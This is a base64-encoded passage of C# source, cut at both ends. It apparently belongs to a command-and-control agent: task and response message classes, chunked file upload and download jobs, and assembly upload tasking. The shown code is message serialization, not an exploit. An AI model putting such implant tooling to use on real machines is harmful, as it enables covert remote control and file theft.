Zvcm1hdCA9IEAie3siImNvbW1hbmQiIjogIiJ7MH0iIiwgIiJwYXJhbWV0ZXJzIiI6ICIiezF9IiIsICIiaWQiIjogIiJ7Mn0iIiwgIiJ0aW1lc3RhbXAiIjogezN9fX0iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcnNlTGlzdCA9IFRhc2suUGFyc2UodGFzaywgZm9ybWF0LlJlcGxhY2UoInt7IiwgInsiKS5SZXBsYWNlKCJ9fSIsICJ9IikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgcGFyc2VMaXN0ID0gVGFzay5QYXJzZSh0YXNrICsgIn0iLCBUYXNrRm9ybWF0LlJlcGxhY2UoInt7IiwgInsiKS5SZXBsYWNlKCJ9fSIsICJ9IikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHBhcnNlTGlzdFswXSA9PSAiIikNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgZm9ybWF0ID0gQCJ7eyIiY29tbWFuZCIiOiAiInswfSIiLCAiInBhcmFtZXRlcnMiIjogIiJ7MX0iIiwgIiJpZCIiOiAiInsyfSIiLCAiInRpbWVzdGFtcCIiOiB7M319fSI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFyc2VMaXN0ID0gVGFzay5QYXJzZSh0YXNrLCBmb3JtYXQuUmVwbGFjZSgie3siLCAieyIpLlJlcGxhY2UoIn19IiwgIn0iKSk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgaWYgKHBhcnNlTGlzdC5Db3VudCAhPSA0KSB7IHJldHVybiBudWxsOyB9DQogICAgICAgICAgICAgICAgICAgIFRhc2sgbmV3X3Rhc2sgPSBuZXcgVGFzaw0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gcGFyc2VMaXN0WzBdLA0KICAgICAgICAgICAgICAgICAgICAgICAgcGFyYW1ldGVycyA9IHBhcnNlTGlzdFsxXSwNCiAgICAgICAgICAgICAgICAgICAgICAgIGlkID0gcGFyc2VMaXN0WzJdLA0KICAgICAgICAgICAgICAgICAgICAgICAgdGltZXN0YW1wID0gcGFyc2VMaXN0WzNdDQogICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgIHRhc2tzLkFkZChuZXdfdGFzayk7DQogICAgICAgICAgICAgICAgICAgICsrY291bnQ7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiB0YXNrczsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBUYXNrUmVzcG9uc2UNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyB0YXNrX2lkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgdXNlcl9vdXRwdXQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBzdGF0dXMgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBjb21wbGV0ZWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBlcnJvciB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgaW50PyB0b3RhbF9jaHVua3MgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBmdWxsX3BhdGggeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGludD8gY2h1bmtfbnVtIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgY2h1bmtfZGF0YSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGZpbGVfaWQgeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIEpzb25Gb3JtYXQgPSBAInt7IiJ0YXNrX2lkIiI6IiJ7MH0iIiwiInVzZXJfb3V0cHV0IiI6IiJ7MX0iIiwiInN0YXR1cyIiOiIiezJ9IiIsIiJjb21wbGV0ZWQiIjp7M30sIiJlcnJvciIiOiIiezR9IiIsIiJ0b3RhbF9jaHVua3MiIjp7NX0sIiJmdWxsX3BhdGgiIjoiIns2fSIiLCIiY2h1bmtfbnVtIiI6ezd9LCIiY2h1bmtfZGF0YSIiOiIiezh9IiIsIiJmaWxlX2lkIiI6IiJ7OX0iIn19IjsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgSnNvbkZvcm1hdDEgPSBAInt7IiJ0YXNrX2lkIiI6IiJ7MH0iIiwiInVzZXJfb3V0cHV0IiI6IiJ7MX0iIiwiInN0YXR1cyIiOiIiezJ9IiIsIiJjb21wbGV0ZWQiIjoiInszfSIiLCIiZXJyb3IiIjoiIns0fSIiLCIidG90YWxfY2h1bmtzIiI6IiJ7NX0iIiwiImZ1bGxfcGF0aCIiOiIiezZ9IiIsIiJjaHVua19udW0iIjp7N30sIiJjaHVua19kYXRhIiI6IiJ7OH0iIiwiImZpbGVfaWQiIjoiIns5fSIifX0iOw0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBKc29uRm9ybWF0MiA9IEAie3siInRhc2tfaWQiIjoiInswfSIiLCIidXNlcl9vdXRwdXQiIjoiInsxfSIiLCIic3RhdHVzIiI6IiJ7Mn0iIiwiImNvbXBsZXRlZCIiOiIiezN9IiIsIiJlcnJvciIiOiIiezR9IiIsIiJ0b3RhbF9jaHVua3MiIjp7NX0sIiJmdWxsX3BhdGgiIjoiIns2fSIiLCIiY2h1bmtfbnVtIiI6IiJ7N30iIiwiImNodW5rX2RhdGEiIjoiIns4fSIiLCIiZmlsZV9pZCIiOiIiezl9IiJ9fSI7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIEpzb25Gb3JtYXQzID0gQCJ7eyIidGFza19pZCIiOiIiezB9IiIsIiJ1c2VyX291dHB1dCIiOiIiezF9IiIsIiJzdGF0dXMiIjoiInsyfSIiLCIiY29tcGxldGVkIiI6IiJ7M30iIiwiImVycm9yIiI6IiJ7NH0iIiwiInRvdGFsX2NodW5rcyIiOiIiezV9IiIsIiJmdWxsX3BhdGgiIjoiIns2fSIiLCIiY2h1bmtfbnVtIiI6IiJ7N30iIiwiImNodW5rX2RhdGEiIjoiIns4fSIiLCIiZmlsZV9pZCIiOiIiezl9IiJ9fSI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFRvSnNvbihUYXNrUmVzcG9uc2UgdGFza19yZXNwb25zZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBzdHJpbmcgRm9ybWF0ID0gdGFza19yZXNwb25zZS5Kc29uRm9ybWF0Ow0KICAgICAgICAgICAgICAgIGlmICh0YXNrX3Jlc3BvbnNlLnVzZXJfb3V0cHV0ID09IG51bGwpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB0YXNrX3Jlc3BvbnNlLnVzZXJfb3V0cHV0ID0gIiI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICh0YXNrX3Jlc3BvbnNlLmNvbXBsZXRlZCA9PSBudWxsKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdGFza19yZXNwb25zZS5jb21wbGV0ZWQgPSAiIjsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYgKHRhc2tfcmVzcG9uc2UuZXJyb3IgPT0gbnVsbCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHRhc2tfcmVzcG9uc2UuZXJyb3IgPSAiIjsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYgKHRhc2tfcmVzcG9uc2Uuc3RhdHVzID09IG51bGwpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB0YXNrX3Jlc3BvbnNlLnN0YXR1cyA9ICIiOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBzdHJpbmcgdG90YWxfY2h1bmtzOw0KICAgICAgICAgICAgICAgIGlmICh0YXNrX3Jlc3BvbnNlLnRvdGFsX2NodW5rcyA9PSBudWxsKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgRm9ybWF0ID0gdGFza19yZXNwb25zZS5Kc29uRm9ybWF0MTsNCiAgICAgICAgICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gIiI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIEZvcm1hdCA9IHRhc2tfcmVzcG9uc2UuSnNvbkZvcm1hdDI7DQogICAgICAgICAgICAgICAgICAgIHRvdGFsX2NodW5rcyA9IHRhc2tfcmVzcG9uc2UudG90YWxfY2h1bmtzLlRvU3RyaW5nKCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICh0YXNrX3Jlc3BvbnNlLmZ1bGxfcGF0aCA9PSBudWxsKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdGFza19yZXNwb25zZS5mdWxsX3BhdGggPSAiIjsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgc3RyaW5nIGNodW5rX251bTsNCiAgICAgICAgICAgICAgICBpZiAodGFza19yZXNwb25zZS5jaHVua19udW0gPT0gbnVsbCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmIChGb3JtYXQgIT0gdGFza19yZXNwb25zZS5Kc29uRm9ybWF0MikNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgRm9ybWF0ID0gdGFza19yZXNwb25zZS5Kc29uRm9ybWF0MzsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBjaHVua19udW0gPSAiIjsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKEZvcm1hdCAhPSB0YXNrX3Jlc3BvbnNlLkpzb25Gb3JtYXQyKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBGb3JtYXQgPSB0YXNrX3Jlc3BvbnNlLkpzb25Gb3JtYXQxOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGNodW5rX251bSA9IHRhc2tfcmVzcG9uc2UuY2h1bmtfbnVtLlRvU3RyaW5nKCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICh0YXNrX3Jlc3BvbnNlLmNodW5rX2RhdGEgPT0gbnVsbCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHRhc2tfcmVzcG9uc2UuY2h1bmtfZGF0YSA9ICIiOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAodGFza19yZXNwb25zZS5maWxlX2lkID09IG51bGwpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB0YXNrX3Jlc3BvbnNlLmZpbGVfaWQgPSAiIjsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuIFN0cmluZy5Gb3JtYXQoDQogICAgICAgICAgICAgICAgICAgIEZvcm1hdCwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh0YXNrX3Jlc3BvbnNlLnRhc2tfaWQpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKHRhc2tfcmVzcG9uc2UudXNlcl9vdXRwdXQpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKHRhc2tfcmVzcG9uc2Uuc3RhdHVzKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh0YXNrX3Jlc3BvbnNlLmNvbXBsZXRlZCksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodGFza19yZXNwb25zZS5lcnJvciksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodG90YWxfY2h1bmtzKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh0YXNrX3Jlc3BvbnNlLmZ1bGxfcGF0aCksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUoY2h1bmtfbnVtKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh0YXNrX3Jlc3BvbnNlLmNodW5rX2RhdGEpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKHRhc2tfcmVzcG9uc2UuZmlsZV9pZCkNCiAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIFJlc3BvbnNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgdGFza19pZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHN0YXR1cyB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGVycm9yIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgZmlsZV9pZCB7IGdldDsgc2V0O30NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgUmVzcG9uc2VTdWNjZXNzRm9ybWF0ID0gQCJ7eyIic3RhdHVzIiI6ICIiezB9IiIsICIidGFza19pZCIiOiAiInsxfSIifX0iOw0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgUmVzcG9uc2VFcnJvckZvcm1hdCA9IEAie3siInN0YXR1cyIiOiAiInswfSIiLCAiInRhc2tfaWQiIjogIiJ7MX0iIiwgIiJlcnJvciIiOiAiInsyfSIifX0iOw0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgUmVzcG9uc2VEb3dubG9hZEZvcm1hdCA9IEAie3siInN0YXR1cyIiOiAiInswfSIiLCAiInRhc2tfaWQiIjogIiJ7MX0iIiwgIiJmaWxlX2lkIiI6ICIiezJ9IiJ9fSI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxzdHJpbmc+IFBhcnNlU3VjY2VzcyhzdHJpbmcgZGF0YSwgc3RyaW5nIGZvcm1hdCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JtYXQgPSBSZWdleC5Fc2NhcGUoZm9ybWF0KS5SZXBsYWNlKCJcXHsiLCAieyIpOw0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInswfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MH0iLCAiKD8nZ3JvdXAwJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezF9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsxfSIsICIoPydncm91cDEnLiopIik7IH0NCiAgICAgICAgICAgICAgICBNYXRjaCBtYXRjaCA9IG5ldyBSZWdleChmb3JtYXQpLk1hdGNoKGRhdGEpOw0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBtYXRjaGVzID0gbmV3IExpc3Q8c3RyaW5nPigpOw0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMCJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDAiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDEiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG1hdGNoZXM7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxzdHJpbmc+IFBhcnNlRXJyb3Ioc3RyaW5nIGRhdGEsIHN0cmluZyBmb3JtYXQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZm9ybWF0ID0gUmVnZXguRXNjYXBlKGZvcm1hdCkuUmVwbGFjZSgiXFx7IiwgInsiKTsNCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MH0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezB9IiwgIig\/J2dyb3VwMCcuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsxfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MX0iLCAiKD8nZ3JvdXAxJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezJ9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsyfSIsICIoPydncm91cDInLiopIik7IH0NCiAgICAgICAgICAgICAgICBNYXRjaCBtYXRjaCA9IG5ldyBSZWdleChmb3JtYXQpLk1hdGNoKGRhdGEpOw0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBtYXRjaGVzID0gbmV3IExpc3Q8c3RyaW5nPigpOw0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMCJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDAiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDEiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAyIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMiJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBtYXRjaGVzOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIExpc3Q8UmVzcG9uc2U+IFBhcnNlUmVzcG9uc2VzKHN0cmluZyByZXNwb25zZXNfanNvbikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAocmVzcG9uc2VzX2pzb24gPT0gIltdIikNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBudWxsOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZXNwb25zZXNfanNvbiA9IHJlc3BvbnNlc19qc29uLlJlcGxhY2UoIlsiLCBAIiIpLlJlcGxhY2UoIl0iLCBAIiIpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBMaXN0PFJlc3BvbnNlPiByZXNwb25zZXMgPSBuZXcgTGlzdDxSZXNwb25zZT4oKTsNCiAgICAgICAgICAgICAgICBzdHJpbmdbXSByZXNwb25zZXNfc3BsaXQgPSByZXNwb25zZXNfanNvbi5TcGxpdChuZXdbXSB7ICJ9LCIgfSwgU3RyaW5nU3BsaXRPcHRpb25zLlJlbW92ZUVtcHR5RW50cmllcyk7DQogICAgICAgICAgICAgICAgZm9yZWFjaCAoc3RyaW5nIHJlc3BvbnNlIGluIHJlc3BvbnNlc19zcGxpdCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBwYXJzZUxpc3QgPSBuZXcgTGlzdDxzdHJpbmc+IHsgfTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKHJlc3BvbnNlLkNvbnRhaW5zKCJlcnJvciIpKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBwYXJzZUxpc3QgPSBSZXNwb25zZS5QYXJzZUVycm9yKHJlc3BvbnNlLCBSZXNwb25zZUVycm9yRm9ybWF0LlJlcGxhY2UoInt7IiwgInsiKS5SZXBsYWNlKCJ9fSIsICJ9IikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHBhcnNlTGlzdC5Db3VudCAhPSAzKSB7IHJldHVybiBudWxsOyB9DQogICAgICAgICAgICAgICAgICAgICAgICBSZXNwb25zZSBuZXdfcmVzcG9uc2UgPSBuZXcgUmVzcG9uc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGF0dXMgPSBwYXJzZUxpc3RbMF0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFza19pZCA9IHBhcnNlTGlzdFsxXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlcnJvciA9IHBhcnNlTGlzdFsyXQ0KICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlcy5BZGQobmV3X3Jlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBlbHNlIGlmIChyZXNwb25zZS5Db250YWlucygiZmlsZV9pZCIpKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBwYXJzZUxpc3QgPSBSZXNwb25zZS5QYXJzZUVycm9yKHJlc3BvbnNlLCBSZXNwb25zZURvd25sb2FkRm9ybWF0LlJlcGxhY2UoInt7IiwgInsiKS5SZXBsYWNlKCJ9fSIsICJ9IikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHBhcnNlTGlzdC5Db3VudCAhPSAzKSB7IHJldHVybiBudWxsOyB9DQogICAgICAgICAgICAgICAgICAgICAgICBSZXNwb25zZSBuZXdfcmVzcG9uc2UgPSBuZXcgUmVzcG9uc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGF0dXMgPSBwYXJzZUxpc3RbMF0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFza19pZCA9IHBhcnNlTGlzdFsxXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2lkID0gcGFyc2VMaXN0WzJdDQogICAgICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2VzLkFkZChuZXdfcmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgcGFyc2VMaXN0ID0gUmVzcG9uc2UuUGFyc2VTdWNjZXNzKHJlc3BvbnNlICsgIn0iLCBSZXNwb25zZVN1Y2Nlc3NGb3JtYXQuUmVwbGFjZSgie3siLCAieyIpLlJlcGxhY2UoIn19IiwgIn0iKSk7DQogICAgICAgICAgICAgICAgICAgICAgICBwYXJzZUxpc3QuQWRkKCIiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3QuQ291bnQgIT0gMykgeyByZXR1cm4gbnVsbDsgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UgbmV3X3Jlc3BvbnNlID0gbmV3IFJlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gcGFyc2VMaXN0WzBdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBwYXJzZUxpc3RbMV0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBwYXJzZUxpc3RbMl0NCiAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgICAgICByZXNwb25zZXMuQWRkKG5ld19yZXNwb25zZSk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuIHJlc3BvbnNlczsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBKb2JMaXN0DQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBpbnQgam9iX2NvdW50IHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBMaXN0PEpvYj4gam9icyB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBKb2JMaXN0KCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBqb2JzID0gbmV3IExpc3Q8Sm9iPigpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIEpvYg0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgaW50IGpvYl9pZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHRhc2tfaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGJvb2wgY29tcGxldGVkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBib29sIGpvYl9zdGFydGVkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBib29sIHN1Y2Nlc3MgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBjb21tYW5kIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgcGFyYW1ldGVycyB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHJlc3BvbnNlIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBUaHJlYWQgdGhyZWFkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBib29sIHVwbG9hZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgYm9vbCBkb3dubG9hZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgYm9vbCBjaHVua2luZ19zdGFydGVkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBpbnQgdG90YWxfY2h1bmtzIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBpbnQgY2h1bmtfbnVtIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBpbnQgd3JpdGVfbnVtIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgZmlsZV9pZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgbG9uZyBmaWxlX3NpemUgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBwYXRoIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBMaXN0PHN0cmluZz4gY2h1bmtzIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIEpvYigpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgY2h1bmtzID0gbmV3IExpc3Q8c3RyaW5nPigpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIFVwbG9hZFRhc2tpbmcNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBhc3NlbWJseV9pZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHJlbW90ZV9wYXRoIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgVXBsb2FkVGFza2luZ0Zvcm1hdCA9IEAiIiJhc3NlbWJseV9pZCIiOiAiInswfSIiLCAiInJlbW90ZV9wYXRoIiI6ICIiezF9IiIiOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIExpc3Q8c3RyaW5nPiBQYXJzZShzdHJpbmcgZGF0YSwgc3RyaW5nIGZvcm1hdCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JtYXQgPSBSZWdleC5Fc2NhcGUoZm9ybWF0KS5SZXBsYWNlKCJcXCIsIEAiIik7DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC